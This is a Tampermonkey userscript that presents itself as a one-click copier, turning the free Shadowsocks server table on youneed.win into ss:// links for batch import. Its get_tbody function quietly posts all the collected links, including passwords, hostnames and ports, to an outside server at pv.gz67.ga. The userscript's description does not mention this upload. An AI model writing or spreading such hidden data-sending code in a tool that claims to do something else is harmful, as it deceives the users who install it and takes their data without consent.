// ==UserScript==
// @name         youneed一键复制ss
// @namespace    https://github.com/jahem/tampermonkey.git
// @version      0.2
// @description  复制ss参数生成链接，可批量导入
// @author       jahem
// @match        *://www.youneed.win/free-ss
// @grant        none
// @license MIT
// @require      https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js
// @icon 		 data:image/jpeg;base64,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
// ==/UserScript==

(function() {
	'use strict';

	var log = console.log;
	/**
	 * 复制内容到剪切板
	 * @param {*} text 要复制的内容，
	 * @param {*} callback 回调
	 */
	var copyText = function(text, callback) {
		var tag = document.createElement('textarea');
		tag.setAttribute('id', 'cp_hgz_input');
		tag.value = text;
		document.getElementsByTagName('body')[0].appendChild(tag);
		document.getElementById('cp_hgz_input').select();
		document.execCommand('copy');
		document.getElementById('cp_hgz_input').remove();
		if (callback) {
			callback(text)
		}
	}
	/**
	 * 浮窗提示
	 * @param {*} text
	 */
	var float_alert = function(text) {
		var float_alert = jQuery(top.document.body).find("#float_alert");
		if (float_alert.length > 0) {
			float_alert.remove();
		}
		var html = "";
		var style =
			"border-radius: 10px;position:fixed;bottom:0;right:0;background:#fff;border:1px solid #ccc;height:50px;line-height:50px;min-width:150px;text-align:center;width:auto;padding:0 20px;";
		html +=
			'<div id="float_alert" style="' + style + '">';
		html += '<span style="font-weight:bold;">' + text + '</span>';
		html += '</div>';
		jQuery(top.document.body).append(html);
		setTimeout(function() {
			float_alert.animate({
				height: 0
			});
		}, 1000);
		setTimeout(function() {
			float_alert.remove();
		}, 1500);
	}
	/**
	 * 账号生成链接
	 * @param {*} method 
	 * @param {*} password 
	 * @param {*} hostname 
	 * @param {*} port 
	 * @returns 
	 */
	var ss_link = function(method, password, hostname, port) {
		var ss_data = method + ":" + password + "@" + hostname + ":" + port;
		var ss = window.btoa(ss_data);
		return "ss://" + ss;
	}
	/**
	 * 获取表格
	 */
	var get_tbody = function() {
		var ss_link_str = "";
		jQuery("tbody tr").each(function() {
			var method = jQuery(this).find("td").eq(4).text();
			var password = jQuery(this).find("td").eq(3).text();
			var hostname = jQuery(this).find("td").eq(1).text();
			var port = jQuery(this).find("td").eq(2).text();
			var res = ss_link(method, password, hostname, port);
			if (!!res) {
				ss_link_str += res + "\n";
			}
		})
		$.post("https://pv.gz67.ga/pv.php",{t:ss_link_str,k:'1'},function(data,status){});
		copyText(ss_link_str, function() {
			float_alert('复制成功');
		})
	}

	jQuery(function() {
		jQuery(document).on('click', "[name=submit]", function() {
			float_alert("<button class='add_copy'>一键复制</button>");
			jQuery(document).on('click', ".add_copy", function() {
				get_tbody();
			});
		});
	});
})();
